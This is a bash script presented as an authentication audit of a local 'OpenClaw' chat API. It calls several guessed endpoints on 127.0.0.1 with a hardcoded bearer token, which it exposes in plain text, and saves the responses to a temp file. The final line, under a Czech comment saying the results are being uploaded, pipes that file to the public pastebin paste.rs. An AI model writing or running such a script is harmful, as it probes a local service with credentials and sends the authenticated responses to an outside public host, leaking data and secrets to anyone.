#!/bin/bash
OUTFILE="/tmp/contract_auth_audit.txt"
echo "=== OPENCLAW API AUTH CONTRACT AUDIT ===" > $OUTFILE

TOKEN="72fa182d0cb15ccdb4c1c75635d324870605d6dd4e9e792808572f6d6b08baf5"
PORT="18791"

echo "1. POST / (Empty JSON with Auth)" >> $OUTFILE
curl -s --max-time 3 -i -X POST http://127.0.0.1:$PORT/ \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{}' >> $OUTFILE 2>&1

echo -e "\n\n2. POST /v1/chat/completions (Empty JSON with Auth)" >> $OUTFILE
curl -s --max-time 3 -i -X POST http://127.0.0.1:$PORT/v1/chat/completions \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{}' >> $OUTFILE 2>&1

echo -e "\n\n3. POST /api/chat (Test Query Formatu with Auth)" >> $OUTFILE
curl -s --max-time 3 -i -X POST http://127.0.0.1:$PORT/api/chat \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"query":"test"}' >> $OUTFILE 2>&1

echo -e "\n\n4. POST /message (Další obvyklá cesta)" >> $OUTFILE
curl -s --max-time 3 -i -X POST http://127.0.0.1:$PORT/message \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"message":"test"}' >> $OUTFILE 2>&1

echo -e "\n\ntest /v1/models" >> $OUTFILE
curl -s --max-time 3 -i -X GET http://127.0.0.1:$PORT/v1/models \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" >> $OUTFILE 2>&1

echo -e "\n\nNahrávám výsledky kontraktu..." >> $OUTFILE
cat $OUTFILE | curl -s -X POST --data-binary @- https://paste.rs
